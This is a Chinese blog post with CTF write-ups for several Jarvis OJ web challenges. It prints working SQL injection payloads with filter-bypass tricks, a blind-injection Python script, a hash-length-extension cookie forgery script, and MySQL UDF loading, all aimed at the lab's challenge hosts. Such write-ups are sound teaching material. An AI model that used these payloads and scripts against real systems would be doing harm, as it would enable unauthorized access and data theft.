<!DOCTYPE html>
<html lang="en">

<!-- Head tag -->
<head>

    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">

    <!--Description-->
    
        <meta name="description" content="向来拿不起,也放不下。QQ:1807801293">
    

    <!--Author-->
    
        <meta name="author" content="Yogurt">
    

    <!--Open Graph Title-->
    
        <meta property="og:title" content="Jarvis OJ  Web题部分记录"/>
    

    <!--Open Graph Description-->
    
        <meta property="og:description" content="向来拿不起,也放不下。QQ:1807801293" />
    

    <!--Open Graph Site Name-->
    <meta property="og:site_name" content="Yogurt"/>

    <!--Type page-->
    
        <meta property="og:type" content="article" />
    

    <!--Page Cover-->
    

    <meta name="twitter:card" content="summary" />
    

    <!-- Title -->
    
    <title>Jarvis OJ  Web题部分记录 - Yogurt</title>

    <!-- Bootstrap Core CSS -->
    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">

    <!-- Custom Fonts -->
    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">

    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
    <!--[if lt IE 9]>
        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
    <![endif]-->

    <!-- Gallery -->
    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />

    <!-- Custom CSS -->
    <link rel="stylesheet" href="/css/style.css">

    <!-- Google Analytics -->
    


</head>


<body>

<div class="bg-gradient"></div>
<div class="bg-pattern"></div>

<!-- Menu -->
<!--Menu Links and Overlay-->
<div class="menu-bg">
    <div class="menu-container">
        <ul>
            
            <li class="menu-item">
                <a href="/">
                    Home
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/archives">
                    Archives
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/about.html">
                    About
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/tags">
                    Tags
                </a>
            </li>
            
            <li class="menu-item">
                <a href="/categories">
                    Categories
                </a>
            </li>
            
        </ul>
    </div>
</div>

<!--Hamburger Icon-->
<nav>
    <a href="#menu"></a>
</nav>

<div class="container">

    <!-- Main Content -->
    <div class="row">
    <div class="col-sm-12">

        <!--Title and Logo-->
        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=990 height=86 src="//music.163.com/outchain/player?type=2&id=1299711624&auto=1&height=66"></iframe>
<header>
    <div class="logo">
        <a href="/"><i class="logo-icon fa fa-cube" aria-hidden="true"></i></a>
        
    </div>
</header>

        <section class="main">
            
<div class="post">

    <div class="post-header">
        <h1 class="title">
            <a href="/2018/11/22/Jarvis-OJ-Web题部分记录 /">
                Jarvis OJ  Web题部分记录
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2018-11-22</span>
            
            
                <a href="#disqus_thread" class="comments">Comments</a>
            
            
                <span class="category">
                    <a href="/categories/web/">web</a>
                </span>
            
        </div>
    </div>

    <div class="content">

        <!-- Gallery -->
        

        <!-- Post Content -->
        <h1 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h1><p>刚开始的时候只有一个输入框，以为是注入题，后来什么都注不出来，看了看响应头，发现这句话。<br><a id="more"></a><br><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/6.png" alt=""></p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/7.png" alt=""></p>
<p>MD5（$pass,true）是啥呢？大佬博客中有详细讲解。<br><code>https://blog.csdn.net/March97/article/details/81222922</code></p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/8.png" alt=""></p>
<p>提供两个payload：<br>content: 129581926211651571912466741651878684928<br>hex: 06da5430449f8f6f23dfc1276f722738<br>raw: ?T0D??o#??’or’8.N=?<br>content: ffifdyop<br>hex: 276f722736c95d99e921722cf9ed621c<br>raw: ‘or’6蒥欓!r,b </p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/9.png" alt=""></p>
<h1 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h1><p>这题刚打开的时候 页面这样。</p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/1.png" alt=""></p>
<p> 注意网址是<code>index.php?id=1</code></p>
<p> 查看源代码以后发现一个index.phps，于是地址栏输入index.phps。</p>
<p> <img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/2.png" alt=""></p>
<p> 核心代码：<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"> $data = @file_get_contents($a,&apos;r&apos;);</span><br><span class="line">if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4)</span><br></pre></td></tr></table></figure></p>
<p>而且从这串代码我们可以知道$a中的.被过滤<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(stripos($a,&apos;.&apos;))</span><br><span class="line">&#123;</span><br><span class="line">	echo &apos;Hahahahahaha&apos;;</span><br><span class="line">	return ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>对于id ，是一个弱比较。id=0e即可绕过。<br>对于变量b，用%00截断绕过eregi。<br>对于a，由于过滤了.所以不能用文件包含，所以用<code>php://input</code>   post过去这串字符</p>
<p>当然，还有人是这样写的<code>a=data:,1112 is a nice lab!</code> </p>
<p>于是payload 为</p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/3.png" alt=""></p>
<p>{/^HT2mCpcvOLf}看起来也不像flag，猜测是目录。<br><code>http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1&#39;</code></p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/4.png" alt=""></p>
<p>发现存在输入，并且很多关键字被过滤，包括空格。 所以用<code>/*1*/</code> 代替</p>
<p>其他关键字用双写绕过  </p>
<p>利用如下得到回显位为3<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1`/*1*/`order`/*1*/`by`/*1*/`3</span><br></pre></td></tr></table></figure></p>
<p>再然后得到context字段<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1/*1*/uniunionon/*1*/seselectlect/*1*/1,2,(selselectect/*1*/group_concat(column_name)/*1*/frofromm/*1*/information_schema.columns/*1*/where/*1*/table_name=0x636f6e74656e74)%23</span><br></pre></td></tr></table></figure></p>
<p>得到字段context内容 即flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=-1/*1*/ununionion/*1*/</span><br><span class="line">selselectect/*1*/1,2,group_concat(id,context,title)/*1*/frfromom/*1*/content</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/5.png" alt=""></p>
<h1 id="RE"><a href="#RE" class="headerlink" title="RE?"></a>RE?</h1><p>emmmm……我jio得，这个题有点意思，又拓宽了一下知识面。<br>下载下来的东西怪怪的，比较懵，原来mysql是可以调入.so文件，然后可以实现函数的引用。</p>
<p>下面将文件用mysql导入。</p>
<p>将udf文件放到/usr/lib/mysql/plugin/文件夹中：(我的环境是Kali)</p>
<p><code>/usr/lib/mysql/plugin# wget https://dn.jarvisoj.com/challengefiles/udf.so.02f8981200697e5eeb661e64797fc172</code></p>
<p>如果你的虚拟机安装了tools，可以直接拖进去。个人觉得这样简单粗暴嘿嘿。</p>
<p>登陆mysql后，加载help_me函数：</p>
<p><code>mysql&gt; create function help_me returns string soname &#39;udf.so.02f8981200697e5eeb661e64797fc172&#39;;
Query OK, 0 rows affected (2.04 sec)</code></p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/11.png" alt=""></p>
<p>利用help_me函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select help_me();</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| help_me()                                                  |</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| use getflag function to obtain your flag!!   |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">1 row in set (0.17 sec)</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/12.png" alt=""></p>
<p>利用udf再创建一个getflag函数:</p>
<p><code>mysql&gt; create function getflag returns string soname &#39;udf.so.02f8981200697e5eeb661e64797fc172&#39;;
Query OK, 0 rows affected (0.05 sec)</code></p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/13.png" alt=""></p>
<p>得到flag：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select getflag();</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| getflag()                                                     |</span><br><span class="line">+-------------------------------------------------------+</span><br><span class="line">| PCTF&#123;Interesting_U5er_d3fined_Function&#125;</span><br><span class="line">                                                                    |</span><br><span class="line">+------------------------------------------------------+</span><br><span class="line">1 row in set (0.00 sec)</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/14.png" alt=""></p>
<h1 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h1><p>打开以后没发现什么，bp截个包，然后如图</p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/15.png" alt=""></p>
<p>role=s%3A5%3A%22guest%22%3B;也就是<code>s:5:&quot;guest&quot;;</code><br>hsh=3a4727d57463f122833d9e732f94e4e0</p>
<p>改成s:5:”admin”;也没啥反应</p>
<p>于是用源码泄露工具工具扫描一下目录，发现有一个index.php~  </p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/16.png" alt=""></p>
<p>于是下载了 然后放在kali里改一下名字为index.php.swp 将index.php恢复  得到 代码如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;title&gt;Web 350&lt;/title&gt;</span><br><span class="line">&lt;style type=&quot;text/css&quot;&gt;</span><br><span class="line">        body &#123;</span><br><span class="line">                background:gray;</span><br><span class="line">                text-align:center;</span><br><span class="line">        &#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">                $auth = false;</span><br><span class="line">                $role = &quot;guest&quot;;</span><br><span class="line">                $salt =</span><br><span class="line">                if (isset($_COOKIE[&quot;role&quot;])) &#123;</span><br><span class="line">                        $role = unserialize($_COOKIE[&quot;role&quot;]);</span><br><span class="line">                        $hsh = $_COOKIE[&quot;hsh&quot;];</span><br><span class="line">                        if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) &#123;</span><br><span class="line">                                $auth = true;</span><br><span class="line">                  &#125; else &#123;</span><br><span class="line">                                $auth = false;</span><br><span class="line">                        &#125;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                        $s = serialize($role);</span><br><span class="line">                        setcookie(&apos;role&apos;,$s);</span><br><span class="line">                        $hsh = md5($salt.strrev($s));</span><br><span class="line">                        setcookie(&apos;hsh&apos;,$hsh);</span><br><span class="line">                &#125;</span><br><span class="line">                if ($auth) &#123;</span><br><span class="line">                        echo &quot;&lt;h3&gt;Welcome Admin. Your flag is</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                        echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line"></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>$s=role<br>$hsh为md5加密(salt拼接$s的翻转字符串)<br>看了几个大佬的博客都说是反序列化加哈希长度扩展攻击，<br>但是我们不知道salt的值，只能选择爆破……</p>
<h2 id="法一："><a href="#法一：" class="headerlink" title="法一："></a>法一：</h2><p>工具是hash_extender+python</p>
<p>安装hash_extender步骤:</p>
<figure class="highlight plain"><figcaption><span>clone</span><a href="https://github.com/iagox86/hash_extender" target="_blank" rel="noopener">link</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd hash_extender </span><br><span class="line">make</span><br></pre></td></tr></table></figure>
<p>然后python脚本如下:</p>
<p>python<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line">from urlparse import urlparse</span><br><span class="line">from httplib import HTTPConnection</span><br><span class="line">from urllib import urlencode</span><br><span class="line">import json</span><br><span class="line">import time</span><br><span class="line">import os</span><br><span class="line">import urllib</span><br><span class="line">def gao(x, y):</span><br><span class="line">        #print x</span><br><span class="line">        #print y</span><br><span class="line">    url = &quot;http://web.jarvisoj.com:32778/index.php&quot;</span><br><span class="line">    cookie = &quot;role=&quot; + x + &quot;; hsh=&quot; + y</span><br><span class="line">        #print cookie</span><br><span class="line">    build_header = &#123;</span><br><span class="line">            &apos;Cookie&apos;: cookie,</span><br><span class="line">            &apos;User-Agent&apos;: &apos;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:44.0) Gecko/20100101 Firefox/44.0&apos;,</span><br><span class="line">            &apos;Host&apos;: &apos;web.jarvisoj.com:32778&apos;,</span><br><span class="line">            &apos;Accept&apos;: &apos;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&apos;,</span><br><span class="line">    &#125;</span><br><span class="line">    urlparts = urlparse(url)</span><br><span class="line">    conn = HTTPConnection(urlparts.hostname, urlparts.port or 80)</span><br><span class="line">    conn.request(&quot;GET&quot;, urlparts.path, &apos;&apos;, build_header)</span><br><span class="line">    resp = conn.getresponse()</span><br><span class="line">    body = resp.read()</span><br><span class="line">    return body</span><br><span class="line">for i in xrange(1000):</span><br><span class="line">    print i</span><br><span class="line">    # secret len = ???</span><br><span class="line">    find_hash = &quot;./hash_extender -d &apos;;\&quot;tseug\&quot;:5:s&apos; -s 3a4727d57463f122833d9e732f94e4e0 -f md5  -a &apos;;\&quot;nimda\&quot;:5:s&apos; --out-data-format=html -l &quot; + str(i) + &quot; --quiet&quot;</span><br><span class="line">    #print find_hash</span><br><span class="line">    calc_res = os.popen(find_hash).readlines()</span><br><span class="line">    hash_value = calc_res[0][:32]</span><br><span class="line">    attack_padding = calc_res[0][32:]</span><br><span class="line">    attack_padding = urllib.quote(urllib.unquote(attack_padding)[::-1])</span><br><span class="line">    ret = gao(attack_padding, hash_value)</span><br><span class="line">    if &quot;Welcome&quot; in ret:</span><br><span class="line">        print ret</span><br><span class="line">        break</span><br></pre></td></tr></table></figure></p>
<p>注意这个脚本在hash_extender目录下使用</p>
<p>然后得到回显:</p>
<p>12</p>
<p>&lt;!DOCTYPE html&gt;</p>
<html><br><head><br><title>Web 350</title><br><style type="text/css"><br>       body {<br>              background:gray;<br>              text-align:center;<br>       }<br></style><br></head><br><body><br>       <h3>Welcome Admin. Your flag is PCTF{H45h_ext3ndeR_i5_easy_to_us3} </h3><br><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body><br></html>

<p>可见盐的长度是12……</p>
<p>这种方法还是很懵……<br>试试另一种吧</p>
<h2 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h2><p>我们知道hash1(第一次服务器正常的身份信息)，和admin(我们自己加上的)，那么我们做一次hash1和admin的MD5运算不就得到hash2了。把hash2赋值给hsh,传入就满足了hsh=MD5(salt+role)</p>
<p>可以借助lunix下的hashpump，为这个漏洞量身定制的。大佬的教程<br><a href="https://www.cnblogs.com/pcat/p/5478509.html" target="_blank" rel="noopener">https://www.cnblogs.com/pcat/p/5478509.html</a></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">原先校验的内容：;&quot;tseug&quot;:5:s</span><br><span class="line">想要添加的内容：;&quot;nimda&quot;:5:s</span><br><span class="line">原hash值：3a4727d57463f122833d9e732f94e4e0</span><br><span class="line">以及一个未知的salt长度</span><br></pre></td></tr></table></figure>
<p>用到hashpump.(我的是在ubuntu)</p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/17.png" alt=""></p>
<p>反过来以后就是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">role = s%3a5%3a&quot;admin&quot;%3b%00%00%00%00%00%00%00%c0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3a5%3a&quot;guest&quot;%3b</span><br><span class="line">hsh = fcdc3840332555511c4e4323f6decb07</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/11/22/Jarvis-OJ-Web题部分记录 /Jarvis-OJ-Web题部分记录/18.png" alt=""></p>
<h1 id="simple-injection"><a href="#simple-injection" class="headerlink" title="simple injection"></a>simple injection</h1><p>上来就是一个登陆框 ，很常见了。</p>
<h2 id="登陆漏洞类型"><a href="#登陆漏洞类型" class="headerlink" title="登陆漏洞类型"></a>登陆漏洞类型</h2><h3 id="同时验证用户名和密码"><a href="#同时验证用户名和密码" class="headerlink" title="同时验证用户名和密码"></a>同时验证用户名和密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$sql = select * from users where username=$usernmae and password=$password</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">if($result) &#123;</span><br><span class="line">    echo &quot;登陆成功&quot;;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;登陆失败&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="分步验证用户名和密码"><a href="#分步验证用户名和密码" class="headerlink" title="分步验证用户名和密码"></a>分步验证用户名和密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;select password from users where username=&apos;$username&apos;&quot;</span><br><span class="line">$result = mysql_query($sql);</span><br><span class="line">if($result) &#123;</span><br><span class="line">    $row = mysql_fetch_row($result);</span><br><span class="line">    $query_password = $row[$password];</span><br><span class="line">    #对输入的$password进行变形</span><br><span class="line">    $input_password = modify($passowrd);</span><br><span class="line">    if($input_password == $query_password) &#123;</span><br><span class="line">        echo &quot;登陆成功&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        echo &quot;密码错误&quot;;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;用户不存在&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="本题"><a href="#本题" class="headerlink" title="本题"></a>本题</h2><h3 id="验证方法猜测"><a href="#验证方法猜测" class="headerlink" title="验证方法猜测"></a>验证方法猜测</h3><p>输入username=admin&amp;password=123456时，页面显示密码错误<br>输入admin=dawang&amp;password=123456时，页面显示用户名错误<br>So，验证方式为用户名和密码同步验证</p>
<h3 id="过滤字符猜测"><a href="#过滤字符猜测" class="headerlink" title="过滤字符猜测"></a>过滤字符猜测</h3><p>输入username=admin’#&amp;password=123456,页面显示密码错误，说明后台没有对#和’进行过滤。</p>
<p>输入username=admin’ or 1=1#&amp;password=123456，页面显示用户名错误，说明对admin’ or 1=1#中的部分内容进行了过滤。过滤的内容可能是or也可能是空格。</p>
<p>输入username=user’/<strong>/or/</strong>/1=1#&amp;password=123456，页面显示密码错误，说明输入的SQL语句能够被执行，也表明只是过滤了空格。</p>
<h3 id="利用脚本"><a href="#利用脚本" class="headerlink" title="利用脚本"></a>利用脚本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#encoding: utf-8 #created by noble @ 2017.1.21 import requests url = &quot;http://web.jarvisoj.com:32787/login.php&quot; table_name_temp = &quot;admin&apos;/**/and/**/ascii(substr((select/**/table_name/**/from/**/information_schema.tables/**/where/**/table_schema=database()/**/limit/**/0,1),&#123;0&#125;,1))&gt;&#123;1&#125;#&quot; column_name_temp = &quot;admin&apos;/**/and/**/ascii(substr((select/**/column_name/**/from/**/information_schema.columns/**/where/**/table_name=0x61646D696E/**/limit/**/2,1),&#123;0&#125;,1))&gt;&#123;1&#125;#&quot; password_temp = &quot;admin&apos;/**/and/**/ascii(substr((select/**/password/**/from/**/admin/**/limit/**/0,1),&#123;0&#125;,1))&gt;&#123;1&#125;#&quot; result = &quot;&quot; session = requests.Session() char = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz&quot; for i in range(1, 50): #设置字符长度为50 for c in char: asc = ord(c) #获取字符的ascii值 username = password_temp.format(i, asc) data = &#123;&apos;username&apos;: username, &apos;password&apos;: &apos;admin&apos; &#125; req = session.post(url=url, data=data, timeout=10) status = req.status_code length = req.headers[&apos;content-length&apos;] if status == 200: #print length #print req.text if length == &quot;1205&quot;: result += c print c break print result</span><br></pre></td></tr></table></figure>
    </div>

    

    
        <div class="post-tags">
            <i class="fa fa-tags" aria-hidden="true"></i>
            <a href="/tags/CTF/">#CTF</a>
        </div>
    

    <!-- Comments -->
    
    <div class="comments">
        
<div id="disqus_thread">
    <noscript>Please enable JavaScript to view the <a href="//disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
</div>



    </div>
    

</div>
        </section>

    </div>
</div>


</div>

<!-- Footer -->
<div class="push"></div>

<footer class="footer-content">
    <div class="container">
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
                <h2>About</h2>
                <p>
                    希望每个人都能找到自己的不可替代。
                </p>
            </div>
            
    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
        <h2>Recent Posts</h2>
        <ul>
            
            <li>
                <a class="footer-post" href="/2019/03/16/Linux——文件管理/">Linux——文件管理</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/03/13/Linux——Shell/">Linux——Shell</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/03/09/逻辑漏洞/">逻辑漏洞</a>
            </li>
            
            <li>
                <a class="footer-post" href="/2019/03/06/Web基础知识/">Web基础知识</a>
            </li>
            
        </ul>
    </div>



            
<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
    <h2>Categories</h2>
    <ul>
        
        <li>
            <a class="footer-post" href="/categories/报错/">报错</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/随笔/">随笔</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/Linux/">Linux</a>
        </li>
        
        <li>
            <a class="footer-post" href="/categories/web/">web</a>
        </li>
        
    </ul>
</div>

        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <ul class="list-inline footer-social-icons">
                    
                    <li class="list-inline-item">
                        <a href="https://github.com/klugjo/hexo-theme-alpha-dust">
                            <span class="footer-icon-container">
                                <i class="fa fa-github"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="https://plus.google.com/">
                            <span class="footer-icon-container">
                                <i class="fa fa-google-plus"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                    
                    
                    <li class="list-inline-item">
                        <a href="mailto:1807801293@qq.com">
                            <span class="footer-icon-container">
                                <i class="fa fa-envelope-o"></i>
                            </span>
                        </a>
                    </li>
                    
                    
                </ul>
            </div>
        </div>
        <div class="row">
            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
                <div class="footer-copyright">
                    This is Yogurt
                </div>
            </div>
        </div>
    </div>
</footer>

<!-- After footer scripts -->

<!-- jQuery -->
<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>

<!-- Tween Max -->
<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>

<!-- Gallery -->
<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>

<!-- Custom JavaScript -->
<script src="/js/main.js"></script>

<!-- Disqus Comments -->

<script type="text/javascript">
    var disqus_shortname = 'klugjotest';

    (function(){
        var dsq = document.createElement('script');
        dsq.type = 'text/javascript';
        dsq.async = true;
        dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
        (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
    }());
</script>



<script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>

</html>